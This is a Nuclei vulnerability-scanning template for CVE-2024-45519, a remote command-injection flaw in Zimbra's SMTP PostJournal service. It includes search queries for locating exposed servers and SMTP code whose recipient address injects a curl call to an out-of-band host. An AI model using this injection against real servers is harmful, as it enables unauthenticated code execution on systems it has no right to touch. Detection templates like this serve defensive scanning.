id: CVE-2024-45519

info:
  name: Zimbra Collaboration Suite < 9.0.0 - Remote Code Execution
  author: pdresearch,iamnoooob,parthmalhotra,ice3man543
  severity: critical
  description: |
    SMTP-based vulnerability in the PostJournal service of Zimbra Collaboration Suite that allows unauthenticated attackers to inject arbitrary commands. This vulnerability arises due to improper sanitization of SMTP input, enabling attackers to craft malicious SMTP messages that execute commands under the Zimbra user context. Successful exploitation can lead to unauthorized access, privilege escalation, and potential compromise of the affected system's integrity and confidentiality.
  reference:
    - https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories
    - https://blog.projectdiscovery.io/zimbra-remote-code-execution/
    - https://wiki.zimbra.com/wiki/Security_Center
    - https://wiki.zimbra.com/wiki/Zimbra_Releases/10.0.9#Security_Fixes
    - https://wiki.zimbra.com/wiki/Zimbra_Releases/10.1.1#Security_Fixes
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2024-45519
    epss-score: 0.9415
    epss-percentile: 0.99901
    cpe: cpe:2.3:a:zimbra:collaboration:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: zimbra
    product: collaboration
    shodan-query:
      - '[http.title:"zimbra collaboration suite" http.title:"zimbra web client sign in" http.favicon.hash:1624375939]'
      - http.favicon.hash:"1624375939"
      - http.favicon.hash:"475145467"
    fofa-query:
      - '[title="zimbra web client sign in" title="zimbra collaboration suite"]'
      - app="zimbra-邮件系统"
      - icon_hash="1624375939"
      - icon_hash="475145467"
  tags: cve,rce,zimbra,kev,js,cve2024,synacor
javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      let m = require('nuclei/net');
      let address = Host+":"+Port;
      let conn;
      conn=  m.Open('tcp', address)
      conn.Send('EHLO localhost\r\n');
      conn.RecvString()
      conn.Send('MAIL FROM: <aaaa@mail.domain.com>\r\n');
      conn.RecvString()
      conn.Send('RCPT TO: <"aabbb$(curl${IFS}'+oast+')"@mail.domain.com>\r\n');
      conn.RecvString()
      conn.Send('DATA\r\n');
      conn.RecvString()
      conn.Send('aaa\r\n');
      conn.RecvString()
      conn.Send('.\r\n');
      resp = conn.RecvString()
      conn.Send('QUIT\r\n');
      conn.Close()
      resp
    args:
      Host: "{{Host}}"
      Port: 25
      oast: "{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        words:
          - "message delivered"
# digest: 4b0a0048304602210093a556cdebf720a0d0f042e5537f3df1963a4bafa0c8b3248ebe3558f7aa028702210085b00219aec2bc653cdb680a73bec7450439d48782bd9ce6afe1ca26920f49c5:922c64590222798bb761d5b6d8e72950